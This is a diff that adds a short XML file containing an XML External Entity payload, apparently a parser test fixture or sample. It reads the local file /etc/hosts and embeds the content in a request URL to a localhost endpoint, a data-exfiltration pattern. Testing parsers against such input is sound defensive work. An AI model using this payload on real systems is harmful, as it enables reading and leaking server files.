@@ -1,0 +1,7 @@
+<?xml version='1.0'?>
+<!DOCTYPE data [
+<!ENTITY a SYSTEM '/etc/hosts'>
+<!ENTITY b SYSTEM 'http://localhost/dtd?data=&a;'>
+<!ENTITY c  'DATA:===\n&a;\n\n&b;\n\n'>
+
+]><data>&c;</data>
